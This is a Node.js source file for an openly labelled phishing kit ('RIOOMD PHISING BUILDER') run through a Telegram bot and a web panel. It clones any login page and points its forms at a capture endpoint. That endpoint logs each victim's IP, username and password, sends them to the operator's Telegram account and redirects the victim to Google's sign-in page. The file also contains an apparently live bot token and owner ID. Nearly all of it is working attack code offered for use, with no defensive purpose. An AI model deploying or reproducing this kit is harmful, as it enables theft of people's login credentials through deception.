const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const cheerio = require('cheerio');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));

// ============================================
// KONFIGURASI RIOOMD (GANTI DI SINI)
// ============================================
const SECRET_TOKEN = "RIOOMD-2026-X9F2"; // Token Web Panel
const BOT_TOKEN = "8957261476:AAGZB6lYJ7pMXm_v_tOXZPQcIxnglfBqBuI"; // Token dari @BotFather
const OWNER_ID = 6701550065; // ID Telegram lu dari @userinfobot
const PANEL_URL = "http://localhost:3000"; // Ganti pakai domain/IP VPS lu

const DATA_DIR = path.join(__dirname, '.data_rioomd');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

// ============================================
// TELEGRAM BOT RIOOMD
// ============================================
let bot;
if (BOT_TOKEN !== "PASTE_TOKEN_BOTFATHER_DISINI") {
  bot = new TelegramBot(BOT_TOKEN, { polling: true });
  console.log('[RIOOMD TELEGRAM] Bot aktif!');

  bot.onText(/\/start/, (msg) => {
    if (msg.from.id !== OWNER_ID) return;
    bot.sendMessage(msg.chat.id, '🕷️ *RIOOMD PHISING BUILDER*\n\nCommand:\n`/build <url>` - Bikin link phising\n`/creds` - Lihat data masuk', { parse_mode: 'Markdown' });
  });

  bot.onText(/\/build (.+)/, async (msg, match) => {
    if (msg.from.id !== OWNER_ID) return;
    const targetUrl = match[1];
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, `⏳ *RIOOMD System:* Cloning ${targetUrl}...`, { parse_mode: 'Markdown' });

    try {
      const response = await axios.get(targetUrl, {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
      });
      let html = response.data;
      const $ = cheerio.load(html);

      $('form').each((i, el) => {
        $(el).attr('action', '/api/capture');
        $(el).attr('method', 'POST');
      });

      const randomId = Math.random().toString(36).substring(2, 10);
      const fileName = `${randomId}.html`;
      fs.writeFileSync(path.join(DATA_DIR, fileName), $.html());

      const stealthLink = `${PANEL_URL}/accounts/${randomId}`;
      
      bot.sendMessage(chatId, `✅ *RIOOMD LINK SIAP!*\n\nKirim link ini ke target:\n${stealthLink}`, { parse_mode: 'Markdown' });

    } catch (error) {
      bot.sendMessage(chatId, `❌ RIOOMD Error: Gagal cloning URL.`);
    }
  });

  bot.onText(/\/creds/, (msg) => {
    if (msg.from.id !== OWNER_ID) return;
    if (fs.existsSync('captured_rioomd.txt')) {
      const data = fs.readFileSync('captured_rioomd.txt', 'utf-8');
      bot.sendMessage(msg.chat.id, `\`\`\`\n${data.substring(0, 4000)}\n\`\`\``, { parse_mode: 'Markdown' });
    } else {
      bot.sendMessage(msg.chat.id, 'RIOOMD: Belum ada data masuk.');
    }
  });
}

// ============================================
// WEB API RIOOMD
// ============================================
app.post('/api/build', async (req, res) => {
  const { targetUrl, token } = req.body;
  if (token !== SECRET_TOKEN) return res.status(401).json({ error: 'RIOOMD Token salah!' });

  try {
    const response = await axios.get(targetUrl, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }
    });
    let html = response.data;
    const $ = cheerio.load(html);

    $('form').each((i, el) => {
      $(el).attr('action', '/api/capture');
      $(el).attr('method', 'POST');
    });

    const randomId = Math.random().toString(36).substring(2, 10);
    fs.writeFileSync(path.join(DATA_DIR, `${randomId}.html`), $.html());

    res.json({ success: true, link: `${PANEL_URL}/accounts/${randomId}` });
  } catch (error) {
    res.status(500).json({ error: 'RIOOMD Gagal cloning web target' });
  }
});

app.get('/accounts/:id', (req, res) => {
  const filePath = path.join(DATA_DIR, `${req.params.id}.html`);
  if (fs.existsSync(filePath)) res.sendFile(filePath);
  else res.redirect('https://accounts.google.com');
});

app.post('/api/capture', (req, res) => {
  const data = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const time = new Date().toISOString();
  
  let userVal = data.email || data.username || data.identifier || data.phone || Object.values(data)[0] || '-';
  let passVal = data.password || data.pass || data.pin || Object.values(data)[1] || '-';

  const logData = `[${time}] IP: ${ip} | User: ${userVal} | Pass: ${passVal}\n`;
  fs.appendFileSync('captured_rioomd.txt', logData);
  
  if (bot && OWNER_ID) {
    bot.sendMessage(OWNER_ID, `🚨 *RIOOMD TARGET TERTANGKAP!*\n\nIP: ${ip}\nData: \`${userVal} | ${passVal}\``, { parse_mode: 'Markdown' }).catch(()=>{});
  }

  console.log(`\n[RIOOMD HIT] ${userVal} | ${passVal} | IP: ${ip}\n`);
  res.redirect('https://accounts.google.com');
});

app.listen(process.env.PORT || 3000, () => {
  console.log(`[RIOOMD SERVER] Jalan di port ${process.env.PORT || 3000}`);
});
